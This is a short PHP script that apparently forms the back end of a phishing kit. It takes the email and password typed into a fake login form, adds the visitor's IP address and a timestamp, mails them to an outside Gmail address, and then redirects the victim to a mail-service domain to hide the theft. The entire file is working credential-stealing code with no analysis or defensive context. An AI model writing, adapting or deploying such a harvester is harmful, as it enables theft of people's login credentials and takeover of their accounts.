<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$user=$HTTP_POST_VARS["user"];
$user2=$HTTP_POST_VARS["pass"];






$mesaj = "------------MaXx001--------------

-----------liaision In action-------------
Email : $user
Password : $user2




---------------------------------------------------- 
IP : $ip 
DATE : $datamasii 
"; 

$recipient = "terenceheart.heart@gmail.com"; 
$subject = "liaision";
mail($recipient,$subject,$mesaj); 
header("Location: http://mail.liaision.com"); 
?> 